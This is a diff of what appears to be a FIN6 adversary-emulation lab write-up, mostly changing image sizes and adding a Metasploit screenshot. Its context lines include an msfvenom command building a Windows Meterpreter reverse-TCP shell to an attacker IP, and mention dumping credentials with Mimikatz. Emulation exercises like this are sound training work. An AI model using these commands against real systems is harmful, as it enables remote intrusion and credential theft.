@@ -54,7 +54,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Attacker IP] lport=4444 -
 
 Take note that in order to dump credentials with Mimikatz later on the victim's Windows Server, we need to use the x64 version of Windows Meterpreter TCP reverse shell.
 
-![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfVenom_Payload.png){: width="700" height="400"}
+![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfVenom_Payload.png){:width="100%"}
 
 ### 1.4 - Generate Payload Handler
 
@@ -73,6 +73,8 @@ To check the current configuration of the payload handler, we can use the comman
 ```bash
 msf6 exploit(multi/handler) > show options
 ```
+
+![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfConsole_Show_Options.png){:width="100%"}
 
 We now need to configure the payload and exploit appropriately, so the Meterpreter shell can connect back to our attackerVM machine. Let’s list the various options for the payload and exploit using show options:
 
